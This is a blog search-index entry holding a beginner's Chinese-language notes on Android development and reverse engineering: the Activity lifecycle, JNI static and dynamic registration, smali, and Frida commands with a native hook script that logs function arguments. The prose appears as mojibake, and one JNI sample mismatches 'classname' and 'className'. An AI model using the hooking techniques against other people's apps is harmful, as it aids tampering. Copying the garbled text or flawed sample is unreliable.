<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android-2</title>
    <url>/2023/10/18/Android-2/</url>
    <content><![CDATA[<blockquote>
<p>å®‰å“æ–°äººğŸ˜‹</p>
</blockquote>
<span id="more"></span>

<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol>
<li>Android Studio åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç­‰å¾…gradle</li>
<li>æƒ³è¦runèµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªdeviceã€‚åœ¨Android Studioé¡¶æ ï¼Œdevice manager -&gt; create.</li>
</ol>
<ul>
<li>ä»€ä¹ˆéƒ½å…ˆé€‰ç¬¬ä¸€ä¸ªï¼Œç¼ºä»€ä¹ˆä¸œè¥¿ä½¿ç”¨IDEä¸‹è½½</li>
</ul>
<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activityä»£è¡¨äº†ä¸€ä¸ªå…·æœ‰ç”¨æˆ·ç•Œé¢çš„å•ä¸€å±å¹•</p>
<p>Android åˆå§‹åŒ–æ˜¯é€šè¿‡ Activity ä¸­çš„ onCreate() å›è°ƒçš„è°ƒç”¨å¼€å§‹çš„ã€‚å­˜åœ¨æœ‰ä¸€åºåˆ—çš„å›è°ƒæ–¹æ³•æ¥å¯åŠ¨ä¸€ä¸ªæ´»åŠ¨ï¼ŒåŒæ—¶æœ‰ä¸€åºåˆ—çš„æ–¹æ³•æ¥å…³é—­æ´»åŠ¨</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>onCreate()</td>
<td>è¿™æ˜¯ç¬¬ä¸€ä¸ªå›è°ƒï¼Œåœ¨æ´»åŠ¨ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶è°ƒç”¨</td>
</tr>
<tr>
<td>onStart()</td>
<td>è¿™ä¸ªå›è°ƒåœ¨æ´»åŠ¨ä¸ºç”¨æˆ·å¯è§æ—¶è¢«è°ƒç”¨</td>
</tr>
<tr>
<td>onResume()</td>
<td>è¿™ä¸ªå›è°ƒåœ¨åº”ç”¨ç¨‹åºä¸ç”¨æˆ·å¼€å§‹å¯äº¤äº’çš„æ—¶å€™è°ƒç”¨</td>
</tr>
<tr>
<td>onPause()</td>
<td>è¢«æš‚åœçš„æ´»åŠ¨æ— æ³•æ¥å—ç”¨æˆ·è¾“å…¥ï¼Œä¸èƒ½æ‰§è¡Œä»»ä½•ä»£ç ã€‚å½“å‰æ´»åŠ¨å°†è¦è¢«æš‚åœï¼Œä¸Šä¸€ä¸ªæ´»åŠ¨å°†è¦è¢«æ¢å¤æ—¶è°ƒç”¨</td>
</tr>
<tr>
<td>onStop()</td>
<td>å½“æ´»åŠ¨ä¸åœ¨å¯è§æ—¶è°ƒç”¨</td>
</tr>
<tr>
<td>onDestroy()</td>
<td>å½“æ´»åŠ¨è¢«ç³»ç»Ÿé”€æ¯ä¹‹å‰è°ƒç”¨</td>
</tr>
<tr>
<td>onRestart()</td>
<td>å½“æ´»åŠ¨è¢«åœæ­¢ä»¥åé‡æ–°æ‰“å¼€æ—¶è°ƒç”¨</td>
</tr>
</tbody></table>
<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundleä¸»è¦ç”¨äº<strong>ä¼ é€’æ•°æ®</strong>ï¼šå®ƒä¿å­˜çš„æ•°æ®ï¼Œæ˜¯ä»¥key-value(é”®å€¼å¯¹)çš„å½¢å¼å­˜åœ¨çš„ã€‚</p>
<p>æˆ‘ä»¬ç»å¸¸ä½¿ç”¨<em>Bundleåœ¨Activityä¹‹é—´ä¼ é€’æ•°æ®</em>ï¼Œä¼ é€’çš„æ•°æ®å¯ä»¥æ˜¯booleanã€byteã€intã€longã€floatã€doubleã€stringç­‰åŸºæœ¬ç±»å‹æˆ–å®ƒä»¬å¯¹åº”çš„æ•°ç»„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡æˆ–å¯¹è±¡æ•°ç»„ã€‚å½“Bundleä¼ é€’çš„æ˜¯å¯¹è±¡æˆ–å¯¹è±¡æ•°ç»„æ—¶ï¼Œå®ç°SerializableÂ æˆ– Parcelable æ¥å£ã€‚</p>
<h3 id="å¸¸è§ç»„ä»¶"><a href="#å¸¸è§ç»„ä»¶" class="headerlink" title="å¸¸è§ç»„ä»¶"></a>å¸¸è§ç»„ä»¶</h3><ol>
<li>onclickï¼šç‚¹å‡»äº‹ä»¶</li>
<li>buttonï¼šæŒ‰é’®</li>
<li>EditTextï¼š<br>ç¼–è¾‘æ–‡æœ¬æ§ä»¶<br>ç¼–è¾‘æ¡†ï¼ˆEditTextï¼‰æ˜¯TextView çš„å­ç±»ï¼Œåœ¨TextView çš„åŸºç¡€ä¸Šå¢åŠ äº†æ–‡æœ¬ç¼–è¾‘åŠŸèƒ½ï¼Œç”¨äºå¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œä¾‹å¦‚ç™»å½•æ¡†ç­‰ï¼Œæ˜¯éå¸¸å¸¸ç”¨çš„ç»„ä»¶ã€‚</li>
</ol>
<h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android åˆ›å»ºä¸€ä¸ªç©ºé¡¹ç›®ï¼Œæ‰“å¼€hello xxxã€‚å…ˆä¸åœ¨æ„ç»†èŠ‚ï¼Œç›´æ¥ç¼–è¯‘ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œï¼ˆåˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼‰</p>
<p>æ‰“åŒ…æˆAPKæ–‡ä»¶ï¼š</p>
<ol>
<li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li>
<li>Build -&gt; Make Project ç„¶ååœ¨æ‰§è¡Œ1</li>
<li>è·¯å¾„ app&#x2F;build&#x2F;outputs&#x2F;apk</li>
</ol>
<p>å¦‚æœæ˜¯debugç‰ˆæœ¬ï¼Œéœ€è¦æ›´æ”¹ build variants ä¸º release</p>
<p>ç„¶åå°±å¯ä»¥åœ¨jadxä¸­åç¼–è¯‘çœ‹çœ‹ã€‚</p>
<h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol>
<li>Android Studioé€‰æ‹©åˆ›å»ºä¸€ä¸ªnative C++ é¡¹ç›®ï¼Œç­‰å¾…gradle</li>
<li>å‡ºç°ä¸€ä¸ª <code>cpp</code> çš„æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦å†™çš„åº“ã€‚åŒæ—¶å­˜åœ¨javaæ–‡ä»¶å¤¹</li>
</ol>
<ul>
<li>deviceåˆ›å»ºæˆ–è€…ä½¿ç”¨å·²ç»å­˜åœ¨çš„</li>
</ul>
<ol start="3">
<li>Javaå±‚å¯¼å…¥åº“</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>åœ¨Javaä»£ç ä¸­å‡ºç°å¦‚ä¸‹çš„æ–¹æ³•</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote>
<p>åœ¨android ndk ä¸‹å¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥é‡‡ä½¿ç”¨ find å‘½ä»¤æ‰¾ã€‚</p>
</blockquote>
<ol>
<li>æŸäº›ç±»å‹</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>* Â  Â  Â  Â  Â  jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jarray;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>JNIEnv å’Œ JavaVMå£°æ˜ï¼Œåœ¨Cå’ŒC++ ç”¨æ³•ä¸å¤ªç›¸åŒã€‚</li>
</ol>
<p>JNI å®šä¹‰äº†ä¸¤ä¸ªå…³é”®æ•°æ®ç»“æ„ï¼Œå³<code>JavaVM</code>å’Œ<code>JNIEnv</code>ã€‚ä¸¤è€…æœ¬è´¨ä¸Šéƒ½æ˜¯æŒ‡å‘å‡½æ•°è¡¨çš„äºŒçº§æŒ‡é’ˆã€‚ï¼ˆåœ¨ C++ ç‰ˆæœ¬ä¸­ï¼Œå®ƒä»¬æ˜¯ä¸€äº›ç±»ï¼Œè¿™äº›ç±»å…·æœ‰æŒ‡å‘å‡½æ•°è¡¨çš„æŒ‡é’ˆï¼Œå¹¶å…·æœ‰æ¯ä¸ªé€šè¿‡è¯¥å‡½æ•°è¡¨é—´æ¥è°ƒç”¨çš„ JNI å‡½æ•°çš„æˆå‘˜å‡½æ•°ã€‚ï¼‰JavaVM æä¾›<code>è°ƒç”¨æ¥å£</code>å‡½æ•°ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨æ­¤ç±»æ¥å‡½æ•°åˆ›å»ºå’Œé”€æ¯ JavaVMã€‚ç†è®ºä¸Šï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ª JavaVMï¼Œä½† Android åªå…è®¸æœ‰ä¸€ä¸ªã€‚</p>
<p>JNIEnv æä¾›äº†å¤§éƒ¨åˆ† JNI å‡½æ•°ã€‚åŸç”Ÿå‡½æ•°éƒ½ä¼šæ”¶åˆ° JNIEnv ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>JavaVM åŸå‹</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        (*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>JNIEnv</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx æ¯”è¾ƒå¤š</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>native methodï¼Œç­¾åæœ‰ä¸ªå…·ä½“çš„è¡¨</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure>

<h3 id="é™æ€æ³¨å†Œ"><a href="#é™æ€æ³¨å†Œ" class="headerlink" title="é™æ€æ³¨å†Œ"></a>é™æ€æ³¨å†Œ</h3><ol>
<li>é™æ€æ³¨å†Œçš„å‡½æ•°åä¸€èˆ¬ä¸º <code>Java_åŒ…å_ç±»å_å‡½æ•°å</code> å°†åŒ…åä¸­çš„ <code>.</code> æ›¿æ¢ä¸º <code>_</code> å°±æ˜¯nativeå±‚å‡½æ•°çš„åç§°</li>
<li>å‡½æ•°ï¼šä»<code>jni.h</code> å¯ä»¥çœ‹å‡ºï¼Œç¬¬ä¸€ä¸ªæ˜¯JNIEnvï¼Œç¬¬äºŒä¸ªä¸ºjclassï¼Œç„¶åå°±æ˜¯Javaå±‚ä»£ç çš„å‚æ•°</li>
<li>android studio åˆ›å»ºä¸€ä¸ªnative C++ é»˜è®¤ä¸ºé™æ€æ³¨å†Œ</li>
</ol>
<p>native-lib.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javaå±‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¨¡æ‹Ÿå™¨è¿è¡Œ + jadxåç¼–è¯‘ + ida æ‰“å¼€soæ–‡ä»¶</p>
<h3 id="åŠ¨æ€æ³¨å†Œ"><a href="#åŠ¨æ€æ³¨å†Œ" class="headerlink" title="åŠ¨æ€æ³¨å†Œ"></a>åŠ¨æ€æ³¨å†Œ</h3><ol>
<li>å‡½æ•°åä¸ç”¨è¿™ä¹ˆé•¿ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šä¸Javaå±‚çš„åç§°ç›¸åŒï¼Œæ–¹ä¾¿å¼€å‘</li>
<li>JNI_Onload å‡½æ•°ï¼ŒåŠ¨æ€æ³¨å†Œ</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">	JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. ä»JavaVMè·å–JNIEnvï¼Œè¿™é‡Œä½¿ç”¨1.4çš„ç‰ˆæœ¬</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. è·å–æ˜ å°„çš„javaç±»</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. é€šè¿‡RegisterNativesæ–¹æ³•åŠ¨æ€æ³¨å†Œ</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. è¿”å›ç‰ˆæœ¬ï¼Œå¦åˆ™åŠ è½½ä¼šå¤±è´¥ã€‚</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>åŠ¨æ€æ³¨å†Œï¼Œä¸»è¦é JNIEnvçš„RegisterNativeså‡½æ•°</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰ JNINativeMethod æ•°ç»„</li>
</ol>
<ul>
<li><code>getNativeString</code>ä¸ºJavaç±»ä¸­å®šä¹‰çš„Nativeæ–¹æ³•åã€‚</li>
<li><code>()Ljava/lang/String;</code> ä¸ºæ–¹æ³•çš„ç­¾åï¼Œ <code>()</code>è¡¨ç¤ºè¯¥æ–¹æ³•æ— å‚æ•°</li>
<li><code>reinterpret_cast&lt;void*&gt;(getString)</code> ä¸ºNativeå®ç°çš„æ–¹æ³•åã€‚è¿™é‡Œå¼ºåˆ¶è½¬æ¢æˆäº†å‡½æ•°æŒ‡é’ˆã€‚</li>
<li>è¿™äº›å‡½æ•°éƒ½éœ€è¦æˆ‘ä»¬å®ç°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h2 id="smali-è¯­æ³•"><a href="#smali-è¯­æ³•" class="headerlink" title="smali è¯­æ³•"></a>smali è¯­æ³•</h2><p>Dalvik è™šæ‹Ÿæœºï¼šDalvik æ˜¯ Google ä¸“é—¨ä¸º Android å¹³å°è®¾è®¡çš„è™šæ‹Ÿæœºã€‚è™½ç„¶ Android ç¨‹åºå¯ä»¥ä½¿ç”¨ Java è¯­è¨€æ¥è¿›è¡Œå¼€å‘ï¼Œä½† Dalvik VM å’Œ Java VM æ˜¯ä¸¤æ¬¾ä¸åŒçš„è™šæ‹Ÿæœºã€‚Dalvik VM åŸºäºå¯„å­˜å™¨ï¼Œè€Œ Java VM åŸºäºæ ˆ ã€‚Dalvik VM æœ‰ä¸“é—¨çš„æ–‡ä»¶æ‰§è¡Œæ ¼å¼ dex (Dalvik Executable)ï¼Œè€Œ Java VM åˆ™æ‰§è¡Œçš„æ˜¯ Java å­—èŠ‚ç ã€‚DVM æ¯” JVM é€Ÿåº¦æ›´å¿«ï¼Œå ç”¨çš„ç©ºé—´æ›´å°‘ã€‚</p>
<p>ä¸å¿…è¦æ­»è®°ç¡¬èƒŒï¼Œä½¿ç”¨æ—¶æŸ¥è¡¨ï¼Œç”¨ç€å°±ç†Ÿæ‚‰äº†</p>
<p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote>
<p>åªèƒ½è¯´å¤šçœ‹å®˜æ–¹æ–‡æ¡£</p>
</blockquote>
<p>å‘½ä»¤ä½¿ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ—§ç‰ˆ </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># æ–°ç‰ˆé»˜è®¤ä¸ä¼šæš‚åœï¼Œä½¿ç”¨--pause æš‚åœ ã€‚</span></span><br><span class="line">frida-ps -Uai  // è·å¾—åç§°</span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure>

<p>æŸäº›æ–¹æ³•</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–ç¯å¢ƒå˜é‡ï¼Œå°±æ˜¯è·å– JNIEnv ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥è°ƒç”¨JNIEnvçš„æ–¹æ³•</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç±»å‹è½¬åŒ–</span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure>

<h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol>
<li>è·å¾—soåŸºå€</li>
<li>è·å¾—å‡½æ•°åŸºå€ï¼Œè¿›è¡Œattachï¼Œä¸¤ä¸ªæ–¹æ³•ï¼Œè¿›å…¥å‡½æ•°(onEnter)å’Œé€€å‡ºå‡½æ•°(onLeave)çš„æ“ä½œ</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¸€èˆ¬soå±‚å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯JniEnvï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯jclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote>
